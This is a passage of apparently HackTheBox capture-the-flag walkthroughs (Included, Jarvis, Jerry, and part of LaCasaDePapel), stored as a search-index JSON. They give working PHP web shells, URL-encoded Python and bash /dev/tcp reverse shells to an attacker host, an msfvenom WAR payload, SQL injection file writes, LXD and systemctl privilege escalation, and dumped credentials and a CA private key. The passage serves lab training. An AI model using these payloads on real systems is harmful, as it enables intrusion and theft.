get our luck back, looks like we have a <code>tftp</code> service, a really basic <code>ftp</code>(And without authentication!). Let's check it out.</p>"},{"location":"HackTheBox/Included/#tftp-service","title":"Tftp service","text":"<p>Instead of using the <code>tftp</code> client I preferred Python with the library <code>tftpy</code></p> <pre><code>#! /usr/bin/env python3\n\nimport tftpy\n\nclient = tftpy.TftpClient('&lt;MACHINE_IP&gt;', 69)\n\n# Create a testing file (Looks like gets deleted on upload)\nf = open(\"test.txt\", \"w\")\nf.write(\"Im just a test file!\")\nf.close()\n\ntry:\n    client.upload(\"test_remote.txt\", \"test.txt\", timeout=5)\n    print('---------------')\n    print('File uploaded!')\n    print('---------------')\nexcept Exception as e:\n    print(e)\n</code></pre> <p>I tested the script and it is reporting that the file is being uploaded. Now we need to know where it is, i searched for the service configuration file using the LFI we already have:</p> <pre><code>http://&lt;MACHINE_IP&gt;/?file=../../../../etc/default/tftpd-hpa\n# /etc/default/tftpd-hpa TFTP_USERNAME=\"tftp\" TFTP_DIRECTORY=\"/var/lib/tftpboot\" TFTP_ADDRESS=\":69\" TFTP_OPTIONS=\"-s -l -c\" \n</code></pre> <p>And now we know that the files we upload are in <code>/var/lib/tftpboot</code> let's try it:</p> <pre><code>http://&lt;MACHINE_IP&gt;/?file=../../../../var/lib/tftpboot/test_remote.txt\nIm just a test file! \n</code></pre> <p>Cool! I guess we can try to upload something more interesting for us:</p> <pre><code>&lt;?php\n    if(isset($_GET['cmd'])){\n        system($_GET['cmd']);\n    }\n?&gt;\n</code></pre> <p>And the result:</p> <pre><code>http://&lt;MACHINE_IP&gt;/?file=../../../../var/lib/tftpboot/shell_remote.php&amp;cmd=id\nuid=33(www-data) gid=33(www-data) groups=33(www-data) \n</code></pre> <p>Now we have RCE and we can get a reverse shell! We can use this URL encoded payload:</p> <pre><code>http://&lt;MACHINE_IP&gt;/?file=../../../../var/lib/tftpboot/shell_remote.php&amp;cmd=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22&lt;ATACKER_IP&gt;%22%2C&lt;ATACKER_PORT&gt;%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27\n</code></pre>"},{"location":"HackTheBox/Included/#into-the-machine","title":"Into the machine","text":"<p>Once into the machine i looked around for a while, run <code>linpeas</code>... but I couldn't find anything obvious. After  a while I tried the password <code>Sheffield19</code> that we got in the Pathfinder machine and... worked! I guess I should have started with that.</p>"},{"location":"HackTheBox/Included/#from-mike-to-root","title":"From mike to root","text":"<p>The user flag is in <code>/home/mike/user.txt</code>. I immediately saw that this user is part of the <code>lxd</code> group so we can use that for privilege escalation.</p> <pre><code># Import the image\nlxc image import ./alpine-v3.14-x86_64-20210909_2211.tar.gz --alias justAnImage\n\n# Init the storage pool as default if it is not\nlxd init\n\n# Run the image with security.privileged\nlxc init justAnImage nothingBadHere -c security.privileged=true\n\n# Mount the host disk into the container /mnt/root path\nlxc config device add nothingBadHere hostDisk disk source=/ path=/mnt/root recursive=true\n\n# Start the container and attach to it\nlxc start nothingBadHere\nlxc exec nothingBadHere /bin/sh\n</code></pre> <p>Once into the container we can just go to <code>/mnt/root</code> to get access to the host file system as root. Once there, i like to add the SUID bit to the <code>bash</code> binary to get root access outside the container with: <code>bash -p</code>. The root flag is under <code>/root/root.txt</code> and also in the <code>/root</code> folder we can see a file called <code>login.sql</code>:</p> <pre><code>bash-4.4# cat login.sql \n-- MySQL dump 10.16  Distrib 10.1.44-MariaDB, for debian-linux-gnu (x86_64)\n--\n-- Host: localhost    Database: Markup\n-- ------------------------------------------------------\n-- Server version   10.1.44-MariaDB-0ubuntu0.18.04.1\n\n/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;\n/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;\n/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;\n/*!40101 SET NAMES utf8mb4 */;\n/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;\n/*!40103 SET TIME_ZONE='+00:00' */;\n/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;\n/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;\n/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;\n/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;\n\n--\n-- Table structure for table `login`\n--\n\nDROP TABLE IF EXISTS `login`;\n/*!40101 SET @saved_cs_client     = @@character_set_client */;\n/*!40101 SET character_set_client = utf8 */;\nCREATE TABLE `login` (\n  `id` int(11) NOT NULL AUTO_INCREMENT,\n  `username` varchar(100) NOT NULL,\n  `password` varchar(100) NOT NULL,\n  PRIMARY KEY (`id`)\n) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4;\n/*!40101 SET character_set_client = @saved_cs_client */;\n\n--\n-- Dumping data for table `login`\n--\n\nLOCK TABLES `login` WRITE;\n/*!40000 ALTER TABLE `login` DISABLE KEYS */;\nINSERT INTO `login` VALUES (1,'Daniel','&gt;SNDv*2wzLWf');\n/*!40000 ALTER TABLE `login` ENABLE KEYS */;\nUNLOCK TABLES;\n/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;\n\n/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;\n/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;\n/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;\n/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;\n/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;\n/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;\n/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;\n</code></pre> <p>It has new credentials: <code>Daniel:&gt;SNDv*2wzLWf</code></p>"},{"location":"HackTheBox/Jarvis/","title":"Jarvis","text":""},{"location":"HackTheBox/Jarvis/#nmap-scan","title":"Nmap scan","text":"<pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap --min-rate 1000 -p- &lt;MACHINE_IP&gt;     \nStarting Nmap 7.91 ( https://nmap.org ) at 2021-10-14 10:55 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.047s latency).\nNot shown: 65532 closed ports\nPORT      STATE SERVICE\n22/tcp    open  ssh\n80/tcp    open  http\n64999/tcp open  unknown\n\nNmap done: 1 IP address (1 host up) scanned in 25.05 seconds\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/HTB/Jarvis]\n\u2514\u2500$ sudo nmap -sC -sV -p22,80,64999 &lt;MACHINE_IP&gt;\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-10-14 10:57 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.045s latency).\n\nPORT      STATE SERVICE VERSION\n22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)\n| ssh-hostkey: \n|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)\n|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)\n|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)\n80/tcp    open  http    Apache httpd 2.4.25 ((Debian))\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n|_http-server-header: Apache/2.4.25 (Debian)\n|_http-title: Stark Hotel\n64999/tcp open  http    Apache httpd 2.4.25 ((Debian))\n|_http-server-header: Apache/2.4.25 (Debian)\n|_http-title: Site doesn't have a title (text/html).\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 14.04 seconds\n</code></pre> <p>In this case it is a Linux box with only three open ports, two websites and SSH.</p>"},{"location":"HackTheBox/Jarvis/#port-64999","title":"Port 64999","text":"<p>This page just informs that we are banned for 90 seconds, I don't know why because we are good people. Looks like the page always return that, no matter the URL.</p> <p>I tried to change some headers to request the page but no luck.</p>"},{"location":"HackTheBox/Jarvis/#port-80","title":"Port 80","text":"<p>Here we see a hotel page, at first glance I can see a domain name: <code>supersecurehotel.htb</code> and also an email: <code>supersecurehotel@logger.htb</code>. Adding the domain name to my hosts file and visiting it didn't reveal any virtual hosts so let's continue.</p> <p>The <code>/room.php</code> page looks promising, after trying some things looks like the <code>cod</code> URL parameter is SQL injectable beacuse after introducing <code>1 and 4=4</code> the page showed the first room. </p>"},{"location":"HackTheBox/Jarvis/#sql-injection","title":"SQL Injection","text":"<p>After some trial and error the payload <code>100 UNION SELECT 1,2,3,4,5,6,7</code> worked, and showed some of the dummy values used (Don't worry about the encoding because the browser do that for us, at least Firefox).</p> <p>Time to check what platform we have in front: <code>100 UNION SELECT 1,2,3,4,@@version,6,7</code> prints <code>10.1.37-MariaDB-0+deb9u1</code> so we are against MySQL. I had a good time enumerating the information of the database but was useless so I will just skip to the fun part.</p> <p>If the website is using a privileged user we can try to inject files. Using this payload: <code>100 UNION SELECT 1,2,3,4,@@version,6,7 INTO dumpfile '/var/www/html/images/test.txt'</code> and checking <code>/images</code> confirms that we can write files beacuse our test file is there. Changing the payload a bit: <code>100 UNION SELECT '&lt;?php',';',';',';','system($_GET[\\'cmd\\']);',';','?&gt;' INTO outfile '/var/www/html/images/pwn.php'</code> and going to <code>/images/pwn.php?cmd=id</code> confirm that we have now RCE since the page showed: <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code>.</p>"},{"location":"HackTheBox/Jarvis/#getting-a-reverse-shell","title":"Getting a reverse shell","text":"<p>I decided to go for a Python reverse shell, this is the URL encoded payload: <pre><code>export RHOST%3D\"&lt;ATACKER_IP&gt;\"%3Bexport RPORT%3D&lt;ATACKER_PORT&gt;%3Bpython -c 'import sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket()%3Bs.connect((os.getenv(\"RHOST\")%2Cint(os.getenv(\"RPORT\"))))%3B[os.dup2(s.fileno()%2Cfd) for fd in (0%2C1%2C2)]%3Bpty.spawn(\"%2Fbin%2Fsh\")'%0A\n</code></pre></p> <p>Before sending the payload to the web shell, make sure Netcat is listenning. That way the reverse shell will come back.</p>"},{"location":"HackTheBox/Jarvis/#as-www-data-in-the-machine","title":"As www-data in the machine","text":"<p>Once we are in, we can get the database credentials: <code>DBadmin:imissyou</code>. The only users that can login to the server are <code>pepper</code> and <code>root</code>: <pre><code>www-data@jarvis:/$ cat /etc/passwd | grep sh\nroot:x:0:0:root:/root:/bin/bash\npepper:x:1000:1000:,,,:/home/pepper:/bin/bash\n</code></pre></p> <p>The database credential with the <code>pepper</code> user won't work but we have this: <pre><code>www-data@jarvis:/var/www/html/images$ sudo -l\nMatching Defaults entries for www-data on jarvis:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser www-data may run the following commands on jarvis:\n    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py\n</code></pre></p> <p>We can execute the <code>/var/www/Admin-Utilities/simpler.py</code> program as <code>pepper</code>, maybe we can exploit it. The program has an option to execute a <code>ping</code> command and ask for an IP address. After some trial and error looks like the program is not filtering the characters <code>$</code>, <code>(</code> and <code>)</code> so we could inject a command to get a shell as the <code>pepper</code> user: <pre><code>www-data@jarvis:/var/www/Admin-Utilities$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p\n***********************************************\n     _                 _                       \n ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ \n/ __| | '_ ` _ \\| '_ \\| |/ _ \\ '__| '_ \\| | | |\n\\__ \\ | | | | | | |_) | |  __/ |_ | |_) | |_| |\n|___/_|_| |_| |_| .__/|_|\\___|_(_)| .__/ \\__, |\n                |_|               |_|    |___/ \n                                @ironhackers.es\n\n***********************************************\n\nEnter an IP: $(bash)  \npepper@jarvis:/var/www/Admin-Utilities$\n</code></pre></p> <p>Even though it worked... the commands executed in the new shell are not showing any output, so I just executed another reverse shell: <pre><code>www-data@jarvis:/var/www/Admin-Utilities$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p\n***********************************************\n     _                 _                       \n ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ \n/ __| | '_ ` _ \\| '_ \\| |/ _ \\ '__| '_ \\| | | |\n\\__ \\ | | | | | | |_) | |  __/ |_ | |_) | |_| |\n|___/_|_| |_| |_| .__/|_|\\___|_(_)| .__/ \\__, |\n                |_|               |_|    |___/ \n                                @ironhackers.es\n\n***********************************************\n\nEnter an IP: $(bash)  \npepper@jarvis:/var/www/Admin-Utilities$ bash -i &gt;&amp; /dev/tcp/&lt;ATACKER_IP&gt;/&lt;ATACKER_PORT&gt; 0&gt;&amp;1\n</code></pre></p> <p>And now everything is working: <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nc -lnvp 8000\nlistening on [any] 8000 ...\nconnect to [&lt;ATACKER_IP&gt;] from (UNKNOWN) [&lt;MACHINE_IP&gt;] 40576\npepper@jarvis:/var/www/Admin-Utilities$ ls\nls\nsimpler.py\ntest.txt\ntext.txt\n</code></pre></p> <p>We can now grab the user flag under <code>/home/pepper/user.txt</code>.</p>"},{"location":"HackTheBox/Jarvis/#as-pepper-in-the-machine","title":"As Pepper in the machine","text":"<p>The first thing I did was to generate SSH keys for Pepper to get a more stable shell. Now, after checking for SUID files: <pre><code>pepper@jarvis:~$ find / -perm /4000 2&gt; /dev/null \n/bin/fusermount\n/bin/mount\n/bin/ping\n/bin/systemctl\n/bin/umount\n/bin/su\n/usr/bin/newgrp\n/usr/bin/passwd\n/usr/bin/gpasswd\n/usr/bin/chsh\n/usr/bin/sudo\n/usr/bin/chfn\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n</code></pre> We can see that <code>systemctl</code> is a SUID binary and we can use that to escalate.</p>"},{"location":"HackTheBox/Jarvis/#getting-root","title":"Getting root","text":"<p>Since the <code>systemctl</code> binary has the SUID bit it won't drop privileges. The idea is to create a malicious service that will execute a command of our choice. In this case, I will make the service put the SUID bit to the <code>bash</code> binary to get easy privilege escalation from our current SSH session: <pre><code>pepper@jarvis:~$ cat pwn.service \n[Service]\nType=oneshot\nExecStart=/bin/chmod u+s /bin/bash\n[Install]\nWantedBy=multi-user.target\n</code></pre></p> <p>Once the service is created we have to execute it and we would have a SUID <code>bash</code> binary: <pre><code>pepper@jarvis:~$ systemctl link /home/pepper/pwn.service \nCreated symlink /etc/systemd/system/pwn.service \u2192 /home/pepper/pwn.service.\npepper@jarvis:~$ systemctl start pwn.service\npepper@jarvis:~$ ls -l /bin/bash \n-rwsr-xr-x 1 root root 1099016 May 15  2017 /bin/bash\n</code></pre></p> <p>So now we can just: <pre><code>pepper@jarvis:~$ bash -p\nbash-4.4#\n</code></pre> And get the root flag under <code>/root/root.txt</code>.</p>"},{"location":"HackTheBox/Jerry/","title":"Jerry","text":""},{"location":"HackTheBox/Jerry/#nmap-scan","title":"Nmap scan","text":"<pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -v -p- --min-rate 1000 &lt;MACHINE_IP&gt;\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-22 16:47 EDT\nInitiating Ping Scan at 16:47\nScanning &lt;MACHINE_IP&gt; [4 ports]\nCompleted Ping Scan at 16:47, 0.10s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 16:47\nCompleted Parallel DNS resolution of 1 host. at 16:47, 0.00s elapsed\nInitiating SYN Stealth Scan at 16:47\nScanning &lt;MACHINE_IP&gt; [65535 ports]\nDiscovered open port 8080/tcp on &lt;MACHINE_IP&gt;\nSYN Stealth Scan Timing: About 23.19% done; ETC: 16:49 (0:01:43 remaining)\nSYN Stealth Scan Timing: About 51.21% done; ETC: 16:49 (0:00:58 remaining)\nCompleted SYN Stealth Scan at 16:48, 102.13s elapsed (65535 total ports)\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.052s latency).\nNot shown: 65534 filtered ports\nPORT     STATE SERVICE\n8080/tcp open  http-proxy\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 102.34 seconds\n           Raw packets sent: 131151 (5.771MB) | Rcvd: 80 (3.504KB)\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p8080 -sC -sV &lt;MACHINE_IP&gt;\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-22 16:52 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.053s latency).\n\nPORT     STATE SERVICE VERSION\n8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1\n|_http-favicon: Apache Tomcat\n|_http-server-header: Apache-Coyote/1.1\n|_http-title: Apache Tomcat/7.0.88\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 9.60 seconds\n</code></pre> <p>Only Tomcat on port 8080 let's take a look</p>"},{"location":"HackTheBox/Jerry/#foothold","title":"Foothold","text":"<p>The first thing i tried was using some default Tomcat credentials to get access to the Application Manager and... <code>tomcat:s3cret</code> worked, we are in!</p> <p>We can try to upload a malicious application now to get a reverse shell. To generate the payload I will use <code>msfvenom</code>:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/HTB/Jerry]\n\u2514\u2500$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;ATACKER_IP&gt; LPORT=8080 -f war &gt; revshell.war\nPayload size: 1086 bytes\nFinal size of war file: 1086 bytes\n</code></pre> <p>Now we can upload the generated file to the server and deploy it. Once it is deployed, we can spin up a listener and visit the path that contain our application to get access to the machine:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nc -lnvp 8080\nlistening on [any] 8080 ...\nconnect to [&lt;ATACKER_IP&gt;] from (UNKNOWN) [&lt;MACHINE_IP&gt;] 49193\nMicrosoft Windows [Version 6.3.9600]\n(c) 2013 Microsoft Corporation. All rights reserved.\n\nC:\\apache-tomcat-7.0.88&gt;\n</code></pre>"},{"location":"HackTheBox/Jerry/#root","title":"Root","text":"<p>Well in this case this was pretty easy:</p> <pre><code>C:\\apache-tomcat-7.0.88&gt;whoami\nnt authority\\system\n</code></pre> <p>We are already <code>system</code>! So we can just get our flags under <code>C:\\Users\\Administrator\\Desktop\\flags\\2 for the price of 1.txt</code> (Remember to use double quotes when trying to read the file!).</p>"},{"location":"HackTheBox/LaCasaDePapel/","title":"LaCasaDePapel","text":""},{"location":"HackTheBox/LaCasaDePapel/#nmap","title":"Nmap","text":"<p>Time for the typical Nmap scan, let's see what we find:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p- --min-rate=1000 10.10.10.131\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-01-17 19:33 CET\nNmap scan report for 10.10.10.131\nHost is up (0.060s latency).\nNot shown: 65530 closed tcp ports (reset)\nPORT     STATE    SERVICE\n21/tcp   open     ftp\n22/tcp   open     ssh\n80/tcp   open     http\n443/tcp  open     https\n6200/tcp filtered lm-x\n\nNmap done: 1 IP address (1 host up) scanned in 74.87 seconds\n\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p21,22,80,443,6200 -sC -sV 10.10.10.131\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-01-17 19:36 CET\nNmap scan report for 10.10.10.131\nHost is up (0.12s latency).\n\nPORT     STATE    SERVICE  VERSION\n21/tcp   open     ftp      vsftpd 2.3.4\n22/tcp   open     ssh      OpenSSH 7.9 (protocol 2.0)\n| ssh-hostkey: \n|   2048 03e1c2c9791ca66b51348d7ac3c7c850 (RSA)\n|   256 41e495a3390b25f9dadebe6adc59486d (ECDSA)\n|_  256 300bc6662b8f5e4f2628750ef5b171e4 (ED25519)\n80/tcp   open     http     Node.js (Express middleware)\n|_http-title: La Casa De Papel\n443/tcp  open     ssl/http Node.js Express framework\n| tls-alpn: \n|_  http/1.1\n|_ssl-date: TLS randomness does not represent time\n|_http-title: La Casa De Papel\n| tls-nextprotoneg: \n|   http/1.1\n|_  http/1.0\n| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel\n| Not valid before: 2019-01-27T08:35:30\n|_Not valid after:  2029-01-24T08:35:30\n6200/tcp filtered lm-x\nService Info: OS: Unix\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 28.74 seconds\n</code></pre> <p>I will start testing if I can access the FTP service and then explore the web server, remember to add <code>lacasadepapel.htb</code> to the host file!</p>"},{"location":"HackTheBox/LaCasaDePapel/#ftp","title":"FTP","text":"<p>First of all, since I know the version of this service let's see if there are exploits available:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ searchsploit vsftpd 2.3.4\n------------------------------------------------------------------------------------ ---------------------------------\n Exploit Title                                                                      |  Path\n------------------------------------------------------------------------------------ ---------------------------------\nvsftpd 2.3.4 - Backdoor Command Execution                                           | unix/remote/49757.py\nvsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                              | unix/remote/17491.rb\n------------------------------------------------------------------------------------ ---------------------------------\nShellcodes: No Results\n</code></pre> <p>Well I guess that yes they are, let's try to use this backdoor then:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/LaCasaDePapel]\n\u2514\u2500$ python ftp.py 10.10.10.131\nSuccess, shell opened\nSend `exit` to quit shell\nPsy Shell v0.9.9 (PHP 7.2.10 \u2014 cli) by Justin Hileman\nls\nVariables: $tokyo\n</code></pre> <p>We are now in a pretty limited yet interesting shell as <code>dali</code>. That <code>ls</code> command showed a variable called <code>tokyo</code>, and trying to get a bit more about it I got something interesting (I learnt about how to use the shell with the <code>help</code> command btw):</p> <pre><code>show $tokyo\n  &gt; 2| class Tokyo {\n    3|  private function sign($caCert,$userCsr) {\n    4|          $caKey = file_get_contents('/home/nairobi/ca.key');\n    5|          $userCert = openssl_csr_sign($userCsr, $caCert, $caKey, 365, ['digest_alg'=&gt;'sha256']);\n    6|          openssl_x509_export($userCert, $userCertOut);\n    7|          return $userCertOut;\n    8|  }\n    9| }\n</code></pre> <p>Looks like a way of getting a user cert, probably for the website. I will collect the CA private key for later.</p> <pre><code>sudo file_get_contents('/home/nairobi/ca.key')\n=&gt; \"\"\"\n   -----BEGIN PRIVATE KEY-----\\n\n   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\\n\n   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\\n\n   2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl\\n\n   uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M\\n\n   YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\\n\n   s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\\n\n   PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\\n\n   Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\\n\n   1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\\n\n   /CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\\n\n   q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\\n\n   uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\\n\n   I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\\n\n   7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\\n\n   G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\\n\n   sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\\n\n   CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\\n\n   sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\\n\n   ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\\n\n   zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\\n\n   ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\\n\n   9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\\n\n   WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\\n\n   7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\\n\n   aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\\n\n   53udBEzjt3WPqYGkkDknVhjD\\n\n   -----END PRIVATE KEY-----\\n\n   \"\"\"\n</code></pre> <p>I tried to both execute system commands or get the SSH keys for some of the other users using PHP but no luck.</p>"},{"location":"HackTheBox/LaCasaDePapel/#website","title":"Website","text":"<p>Accesing the site using <code>http</code> is pretty useless. I mean, maybe you can do something with the QR code and the authenticator token but I found nothing. However, when connecting to the server through <code>https</code> we get an error telling us that we need a client certificate. I guess is googling time because my knowledge here is pretty limite to be honest.</p> <p>First, we will need to get the requirements for our client cert:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ openssl s_client -connect 10.10.10.131:443\nCONNECTED(00000003)\nCan't use SSL_get_servername\ndepth=0 CN = lacasadepapel.htb, O = La Casa De Papel\nverify error:num=18:self-signed certificate\nverify return:1\ndepth=0 CN = lacasadepapel.htb, O = La Casa De Papel\nverify return:1\n---\nCertificate chain\n 0 s:CN = lacasadepapel.htb, O = La Casa De Papel\n   i:CN = lacasadepapel.htb, O = La Casa De Papel\n   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256\n   v:NotBefore: Jan 27 08:35:30 2019 GMT; NotAfter: Jan 24 08:35:30 2029 GMT\n---\nServer certificate\n-----BEGIN CERTIFICATE-----\nMIIC6jCCAdICCQDISiE8M6B29jANBgkqhkiG9w0BAQsFADA3MRowGAYDVQQDDBFs\nYWNhc2FkZXBhcGVsLmh0YjEZMBcGA1UECgwQTGEgQ2FzYSBEZSBQYXBlbDAeFw0x\nOTAxMjcwODM1MzBaFw0yOTAxMjQwODM1MzBaMDcxGjAYBgNVBAMMEWxhY2FzYWRl\ncGFwZWwuaHRiMRkwFwYDVQQKDBBMYSBDYXNhIERlIFBhcGVsMIIBIjANBgkqhkiG\n9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz3M6VN7OD5sHW+zCbIv/5vJpuaxJF3A5q2rV\nQJNqU1sFsbnaPxRbFgAtc8hVeMNii2nCFO8PGGs9P9pvoy8e8DR9ksBQYyXqOZZ8\n/rsdxwfjYVgv+a3UbJNO4e9Sd3b8GL+4XIzzSi3EZbl7dlsOhl4+KB4cM4hNhE5B\n4K8UKe4wfKS/ekgyCRTRENVqqd3izZzz232yyzFvDGEOFJVzmhlHVypqsfS9rKUV\nESPHczaEQld3kupVrt/mBqwuKe99sluQzORqO1xMqbNgb55ZD66vQBSkN2PwBeiR\nPBRNXfnWla3Gkabukpu9xR9o+l7ut13PXdQ/fPflLDwnu5wMZwIDAQABMA0GCSqG\nSIb3DQEBCwUAA4IBAQCuo8yzORz4pby9tF1CK/4cZKDYcGT/wpa1v6lmD5CPuS+C\nhXXBjK0gPRAPhpF95DO7ilyJbfIc2xIRh1cgX6L0ui/SyxaKHgmEE8ewQea/eKu6\nvmgh3JkChYqvVwk7HRWaSaFzOiWMKUU8mB/7L95+mNU7DVVUYB9vaPSqxqfX6ywx\